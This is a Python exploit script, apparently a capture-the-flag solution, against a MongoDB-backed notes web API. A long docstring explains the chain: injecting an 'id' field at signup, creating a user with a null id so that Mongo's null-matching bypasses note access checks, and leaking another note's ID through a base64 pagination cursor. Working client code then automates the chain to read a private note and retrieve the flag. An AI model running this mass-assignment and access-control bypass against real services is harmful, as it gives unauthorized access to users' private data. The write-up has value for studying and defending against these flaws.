"""
Initialize + run:
`python3 -m venv .venv`
`.venv/bin/activate`
`pip install -r pwn_requirements.txt`
`python pwn.py <base_url>`
"""

# boilerplate setup
import base64
import secrets
import sys
from typing_extensions import Literal, NotRequired

mode: Literal["proxy", "raw"] = "raw"

try:
    BASE_URL = sys.argv[1].rstrip("/")
except IndexError:
    raise ValueError("Usage: python pwn.py <base_url>")


from typing import Any, Dict, List, Optional, TypedDict
import requests

# Small api client for the notes api


class User(TypedDict):
    id: str
    email: str


class AuthResponse(TypedDict):
    token: str
    user: User


class Note(TypedDict):
    id: str
    title: str
    content: str
    owner: str
    sharedWith: NotRequired[List[str]]
    isPublic: bool


class PaginatedNotes(TypedDict):
    items: List[Note]
    nextCursor: Optional[str]


class NotesClient:
    """Client for: create user, get note by id, search notes (cursor)."""

    BASE_URL: str
    token: Optional[str] = None

    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip("/")

    def _auth_headers(self) -> Dict[str, str]:
        if self.token is None:
            raise ValueError("Token is required")
        return {"Accept": "application/json", "Authorization": f"Bearer {self.token}"}

    def create_user(
        self, *, email: str, password: str, additional_json: Dict[str, Any] = {}
    ) -> AuthResponse:
        # ! additional_json is only for the exploit!
        r = requests.post(
            f"{self.base_url}/api/users/signup",
            json={"email": email, "password": password, **additional_json},
            timeout=20,
        )
        r.raise_for_status()  # 201 expected
        data = r.json()
        return {
            "token": data.get("token", ""),
            "user": {
                "id": data.get("user", {}).get("id", ""),
                "email": data.get("user", {}).get("email", ""),
            },
        }

    def delete_current_user(self) -> None:
        r = requests.delete(
            f"{self.base_url}/api/users/me",
            headers=self._auth_headers(),
            timeout=20,
        )
        r.raise_for_status()  # 204 expected

    def get_note_by_id(self, note_id: str) -> Note:
        r = requests.get(
            f"{self.base_url}/api/notes/{note_id}",
            headers=self._auth_headers(),
            timeout=20,
        )
        r.raise_for_status()  # 200 expected
        return r.json()  # Note

    def create_note(
        self,
        *,
        title: str,
        content: str,
        is_public: Optional[bool] = None,
        additional_json: Dict[str, Any] = {},
    ) -> Note:
        json: dict[str, Any] = {"title": title, "content": content, **additional_json}
        if is_public is not None:
            json["isPublic"] = bool(is_public)
        r = requests.post(
            f"{self.base_url}/api/notes",
            json=json,
            headers=self._auth_headers(),
            timeout=20,
        )
        r.raise_for_status()  # 201 expected
        return r.json()  # Note

    def delete_note(self, note_id: str) -> None:
        r = requests.delete(
            f"{self.base_url}/api/notes/{note_id}",
            headers=self._auth_headers(),
            timeout=20,
        )
        r.raise_for_status()  # 204 expected

    def search_notes_by_cursor(
        self,
        *,
        regex: str,
        cursor: Optional[str] = None,
        limit: Optional[int] = None,
    ) -> PaginatedNotes:
        params: Dict[str, Any] = {"regex": regex}
        if cursor is not None:
            params["cursor"] = cursor
        if limit is not None:
            params["limit"] = int(limit)
        r = requests.get(
            f"{self.base_url}/api/notes/search",
            params=params,
            headers=self._auth_headers(),
            timeout=20,
        )
        r.raise_for_status()  # 200 expected
        data = r.json()
        return {"items": data.get("items", []), "nextCursor": data.get("nextCursor")}

    def get_flag(self, password: str) -> str:
        r = requests.post(
            f"{self.base_url}/api/flag",
            json={"password": password},
            headers=self._auth_headers(),
            timeout=20,
        )
        r.raise_for_status()  # 200 expected
        return r.json()["flag"]


client = NotesClient(BASE_URL)

TARGET_NOTE_TITLE = "No one can see my privates!"

"""
# Idea
The main exploit is the null-id-user exploit, and finding the note id through the amazing cursor-based pagination
is just a "bonus" on top to not make it directly solvable just by dumping id null into the user.

# Exploit
In the source code, the standard practice of using Mongo's _id was ignored, and (coming from sql world) instead an id field was created manually.
`id: { type: String, default: generateId, unique: true }`
Then, when creating users / notes, the hand-written validator first validates the input using a standard ts type guard, then directly spreads user input into Mongoose, which then strips extra keys and populates defaults.
!However, if a user passes an id into their input JSON, this means a resource is created with a user-defined id, for example "abcd", which is not a valid uuid.
-> What also works is to pass a json with `{ ..., "id": null }`, and the user gets created! (Step 1) 
---
Now what can we do with our nice user?
Notice that the id now gets encoded into the JWT, and hence in the entire note.ts controller, the `userId: string` param actually is `null` at runtime.
(TS types are only annotations, and if you fail to sanitize user-input as the source did or write hacky code with type casts, they can be different from runtime types)
In the `findAccessibleNote` function, notice that the filter is `$or: [{ owner: userId }, { sharedWith: userId }]` => `$or: [{ owner: null }, { sharedWith: null }]`.
In MongoDB, querying for `{field: null}` looks for documents where the field is either missing or has value `null`.
It happens to be that actually a note which is shared with no one has the sharedWith array missing by design.
-> Our null user can look up any document by id which is not shared with anyone (Step 2).
---
Now we just have to find the id of our target note!
Notice that there is a function `getPaginatedRegexNotes`, which performs access checks on the server-side for whatever reason,
and encodes the last found note in the cursor. Notice the last-found note does not have to comply to the access check.
As such, if we can ensure that this id is exactly our target, we have found the needed id.
-> Create a note with the same title as our target, if the note's uuid comes before our target, then our target will be the next document! (Step 0)
    -> here, we could also create a note with random uuid and hope it comes before the target.
-> (note: it could also be solved without knowledge of the target note's title by: enumerating all titles, then getting the content like below. but this is a little bit annoying)

# Concrete Exploit Steps
Step 0: get uuid of the flag note
^ this is the "setup" part of the expoit, the pagination leaks other's ids. 
  1. create a document with id 00000000-0000-0000-0000-000000000000 and the same title as the target note (or create a document with random uuid and hope this uuid comes before the target)
  2. search for documents by title with the target note's title as the regex
  3. inspect the returned cursor -> get uuid (this is the flag note's id, since it is the "next" uuid, and only one other note which is behind the current one matches the regex)
Step 1: create a user with `null` id
^ this is the first part of the exploit, ids are passed through to mongo on user creation and not validated from user input
Step 2: access the flag note with our user -> will have access to the admin note since the user is null
^ this is the second part of the exploit, when the id is null, then mongo matches all documents which are not shared with anyone (missing sharedWith field) through { sharedWith: <id> }
Step 3: get the flag
"""

# Step 0
# just a random user to authenticate against the api, does not have to be the null user yet
auth_response = client.create_user(
    email=f"{secrets.token_hex(8)}@example.com", password="password"
)
client.token = auth_response["token"]


def get_flag_note_id(client: NotesClient, target_note_title: str) -> str:
    """
    :param client: an authenticated client
    :returns: the id of the flag note if found, None otherwise
    """
    # this will create a new note with the lowest possible uuid.
    # if the target note uuid is behind this created note's uuid, then the cursor will contain the target note's uuid
    created_note = client.create_note(
        title=target_note_title,
        content="abcabc",
        additional_json={"id": "00000000-0000-1000-8000-000000000000"},
    )
    notes = client.search_notes_by_cursor(regex=target_note_title)
    if notes["nextCursor"] is None:
        raise ValueError("No next cursor found")
    cursor_content = base64.b64decode(notes["nextCursor"]).decode("utf-8")
    # ^ will be the "next" uuid
    if created_note["id"] == cursor_content:
        raise ValueError("No flag note id found")
    # cleanup to not have hanging note with uuid 00000000-0000-0000-0000-000000000000
    client.delete_note(note_id=created_note["id"])
    return cursor_content


# Step 0
flag_note_uuid = get_flag_note_id(client, TARGET_NOTE_TITLE)

# Step 1
# create a user with `null` id
auth_response = client.create_user(
    email=f"null@example.com", password="password", additional_json={"id": None}
)
client.token = auth_response["token"]

# Step 2
try:
    note = client.get_note_by_id(note_id=flag_note_uuid)

    # Step 3
    print(f"Content of flag note: {note['content']}")

    password = note["content"].split(" ")[-1]

    flag = client.get_flag(password=password)
    print("---")
    print(flag)

finally:
    # only one null user is allowed
    client.delete_current_user()
